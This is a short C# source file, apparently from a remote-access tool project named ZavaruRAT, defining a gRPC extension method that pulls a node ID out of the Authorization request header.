#region

using Grpc.Core;

#endregion

namespace ZavaruRAT.Main;

public static class ZavaruExtensions
{
    public static string GetNodeId(this ServerCallContext context)
    {
        return context.RequestHeaders.Get("Authorization")!.Value.Split(':')[1];
    }
}
